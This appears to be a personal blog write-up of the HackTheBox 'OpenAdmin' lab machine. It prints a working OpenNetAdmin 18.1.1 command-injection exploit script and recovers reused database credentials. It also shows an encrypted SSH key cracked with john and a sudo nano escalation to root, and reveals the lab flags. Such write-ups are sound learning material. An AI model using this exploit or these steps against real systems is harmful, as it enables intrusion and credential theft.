---
title: HackTheBox OpenAdmin
author: Marius Kimmina
date: 2020-05-02 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [linux]
published: true
---

# 0x0 Introduction
The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes
![image](/assets/images/openadmin-thumb.png "Openadmin Logo")

0x1 getting a Foothold

Like most people probably do I started of the box with an nmap scan which returned the following result:

```
Nmap scan report for 10.10.10.171
Host is up (0.0058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  1 06:58:04 2020 -- 1 IP address (1 host up) scanned in 7.02 seconds
```

ssh is not all that intresting as the attack surface there is rather low. so I decieded to look at the web site hosted at port 80
and found the Apache default page, just like nmap already told us but it never hurts to look ourselfs.  
Hoping to find other intresting endpoints on the Website I decided to run gobuster against it:

```
mindslave@kalibox:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u 10.10.10.171
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/01 07:14:34 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
===============================================================
2020/02/01 07:16:12 Finished
===============================================================
```

Looking at these 2 Endpoint we see "SOLMSUSIC" and "ARCWORK", both sides were created from some template and are filled with lorem ipsum text.

After going through these sites and not really getting a foothold onto anything, I decieded to run gobuster again with a different list, tbh at this point I got kinda desperate from not finding anything so why not give a shot..

```
mindslave@kalibox:~/hackthebox/OpenAdmin$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 10.1
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/01 10:12:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/artwork (Status: 301)
/ona
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
===============================================================
2020/02/01 10:12:25 Finished
===============================================================
```

This time we found /sierra and /ona, so there is new hope (and this time gobuster also informed me about the .htaccess).  
On /sierra we also find a lot of lorem-ipsum text but the /ona endpoint proved to be very interesting because it showed us that OpenNetAdmin is running on the box (something I have personally never heard of before), and it also tells us that it is an outdated version of OpenNetAdmin. A google search for 'OpenNetAdmin 18.1.1 Exploit' came back with an RCE as the first result.

```
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Copied that into a local file and we are ready to use it. 

```
mindslave@kalibox:~/hackthebox/OpenAdmin$ ./exploit.sh 10.10.10.171/ona/
$ whoami
www-data
```

# 0x2 Getting the user.txt 

Now this part of the box took really, and I mean really, long for me.  
The first useful thing I found by looking at /etc/home is that there  
are 2 users jimmy and joanna
from looking at the /etc/passwd we could also learn that jimmy is the admin for the apache server

```
/etc/apache2/sites-available/openadmin.conf:    ServerAdmin jimmy@openadmin.htb
```

And I also found out that you can look into /ona with admin admin as default creds which, ofcourse, still worked

```
/opt/ona/docs/INSTALL:8. You can log in as "admin" with a password of "admin"
```

And I also found these database credentials

```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

And ofcoure jimmy reused this database password for his user account, which means we could now log in as jimmy

```
mindslave@kalibox:~$ ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  7 05:41:26 UTC 2020

  System load:  0.01              Processes:             146
  Usage of /:   49.6% of 7.81GB   Users logged in:       2
  Memory usage: 22%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  7 05:39:24 2020 from 10.10.14.147
jimmy@openadmin:~$   
```

Now as Jimmy we want to find out which files belong to us and since all the interesting stuff seems to be in /var we do
```
find /var -user jimmy 
```

which reveals:
```
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```

main.php looked extremly interesting

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This file is trying to output joanna's ssh key, which we would obviously be interested in.
running it with a simple "php main.php" we just get a permission denied tho. 
I then tried to access these files via the browser but could not find them on 10.10.10.171/main.php
neither 10.10.10.171/internal/main.php, which after a while got me thinking that they might be runnig on a different port

```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name             
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```

Which turned out to be correct, the /internal pages are running on port 52846 and a simple curl gave us the ssh key

```html
jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Now before we can use this to connect as joanna we have to find the password the Key, lets ask our friend John.
First convert the file into john-readable format:

```
/usr/share/john/ssh2john.py id_rsa > johnfile.txt
```

Now we can use this john to recover the password from the johnfile.

```
mindslave@kalibox:~/hackthebox/OpenAdmin/ssh$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2020-02-07 08:27) 0.3745g/s 5371Kp/s 5371Kc/s 5371KC/sa6_123..*7¡Vamos!
Session completed
```

and we found the password: "bloodninjas". This enabled us log in as Joanna and gave us the user flag for this box

```
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt 
c9b2cf07d40807e62af62660f0c81b5f
```

# 0x3 getting the root.txt

This was acctually easier than getting the user, once you are logged in with joanna do:
```
joanna@openadmin:~$ sudo -l                                                             
Matching Defaults entries for joanna on openadmin:                                           
    env_reset, mail_badpass,                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
                                                                                             
User joanna may run the following commands on openadmin:                                           
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

you can open the /opt/priv with nano as root without getting prompted for a password, once you open nano on that file  
you can instruct nano to read the /root/root.txt, which since it runs as root it will do without complains.  

```
2f907ed450b361b2c2bf4e8795d5b561
```

And that is it, instead of opening the root.txt you could also edit the /etc/passwd or the sudoers file to actually become a root user.  
At this point we have owned the box.  
This was my first Box on HTB and it won't be the last!



